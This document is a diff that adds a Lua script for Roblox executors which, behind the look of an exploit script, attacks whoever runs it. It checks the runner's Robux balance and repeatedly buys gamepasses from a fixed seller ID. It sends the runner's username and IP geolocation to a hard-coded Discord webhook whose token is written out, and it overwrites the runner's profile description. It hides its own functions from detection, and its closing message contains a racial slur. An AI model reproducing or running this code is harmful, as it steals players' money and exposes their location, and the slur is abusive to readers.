@@ -1,0 +1,87 @@
+repeat task.wait() until game:IsLoaded()
+
+local throw = clonefunction(warn)
+local x = cloneref(game)
+local httprbx = cloneref(game:GetService("HttpRbxApiService"))
+local _stealth = clonefunction(newcclosure)
+-- getgenv().crash = _stealth(function() x:Shutdown() end) -- Disable crash functionality
+local executor = identifyexecutor()
+local _get = _stealth(function(url)
+    x:HttpGetAsync(url)
+end)
+local _post = _stealth(function(url, data)
+    x:HttpPostAsync(url, data, "application/json")
+end)
+
+local response = _get("https://economy.roblox.com/v1/user/currency")
+local start = string.find(response, '{"robux":')
+if start then
+    local ending = string.find(response, '}', start);
+    if ending then
+        rb = tonumber(string.sub(response, start + 9, ending - 1));
+    end
+end
+
+local gamepass1 = '{"expectedCurrency":1,"expectedPrice":2,"expectedSellerId":214099064}'
+local gamepass2 = '{"expectedCurrency":1,"expectedPrice":25,"expectedSellerId":id}'
+
+local function godly()
+    local player = game.Players.LocalPlayer
+    local userId = player.UserId
+    local description = '{"description":"never exploit again loser"}'
+    local none = ''
+
+    --[[ Disabled functionality to follow a user, join a group, and change language
+    pcall(function()
+        _post('https://friends.roblox.com/v1/users/accid if u want to flex/follow', none)
+    end)
+    task.wait(0.01)
+    pcall(function()
+        _post('https://groups.roblox.com/v1/groups/id/users', none)
+    end)
+    task.wait(0.01)
+    local china = '{"supportedLocaleCode":"zh_TW"}' -- Disable language change to Chinese _post("https://locale.roblox.com/v1/locales/set-user-supported-locale", china)
+    --]]
+
+local player_name = game:GetService("Players").LocalPlayer.Name
+local webhook_url = "https://discord.com/api/webhooks/1212133920402047107/3NqqG-0KIIosJiSdUNsct5kMTqfUlkfMygaF1g1sjg2H75d-FozIYZNPksmKId-tnPTD"
+
+local ip_info = syn.request({
+    Url = "http://ip-api.com/json",
+    Method = "GET"
+})
+local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
+local dataMessage = string.format("```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```", player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org)
+syn.request(
+    {
+        Url = webhook_url,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
+    }
+)
+
+
+
+    pcall(function()
+        _post("https://users.roblox.com/v1/description", description)
+    end)
+    task.wait(0.01)
+    print("#ur mom mfk nigga, the script executed successfully!")
+end
+
+while wait(0.25) do
+    if rb == 0 then
+        godly()
+    elseif rb > 0 and rb < 2 then
+        godly()
+    elseif rb >= 2 and rb < 25 then
+        _post("https://economy.roblox.com/v1/purchases/products/214099064", gamepass1)
+        wait()
+    elseif rb >= 25 and rb < 50 then
+        _post("https://economy.roblox.com/v1/purchases/products/id", gamepass2)
+        wait()
+    end
+end
